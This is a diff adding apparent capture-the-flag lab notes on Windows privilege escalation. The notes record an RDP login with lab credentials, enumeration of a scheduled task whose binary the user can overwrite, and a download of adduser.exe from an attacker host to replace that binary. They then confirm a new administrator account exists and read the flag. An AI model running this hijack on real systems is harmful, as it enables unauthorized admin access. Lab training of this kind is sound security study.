@@ -5,3 +5,42 @@ HINT
 Follow the steps in this learning unit.
 Install mingw-w64 with the command: sudo apt install mingw-w64 .
 If you encounter any issues with RunAs, try running an Administrator command prompt and entering dave2's credentials to obtain a shell.
+
+xfreerdp /u:steve /p:securityIsNotAnOption++++++ /v:192.168.207.220
+
+# Start the Powershell
+schtasks /query /fo LIST /v
+...
+TaskName:                             \Microsoft\CacheCleanup
+Next Run Time:                        4/29/2024 6:19:21 AM
+Author:                               CLIENTWK220\daveadmin
+Task To Run:         C:\Users\steve\Pictures\BackendCacheCleanup.exe
+...
+
+PS C:\Users\steve> icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
+C:\Users\steve\Pictures\BackendCacheCleanup.exe NT AUTHORITY\SYSTEM:(I)(F)
+BUILTIN\Administrators:(I)(F)
+CLIENTWK220\steve:(I)(F) 
+CLIENTWK220\offsec:(I)(F)
+
+PS C:\Users\steve> iwr -Uri http://192.168.45.223/adduser.exe -Outfile BackendCacheCleanup.exe
+PS C:\Users\steve> move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
+PS C:\Users\steve> move .\BackendCacheCleanup.exe .\Pictures\
+
+PS C:\Users\steve> net user
+...
+dave2
+...
+
+PS C:\Users\steve> net localgroup administrators
+...
+dave2
+...
+
+start-process PowerShell -verb runas
+PS C:\Users\daveadmin\Desktop> type flag.txt
+OS{54b64ccd95685940cba223fb35c7735f}
+
+
+
+
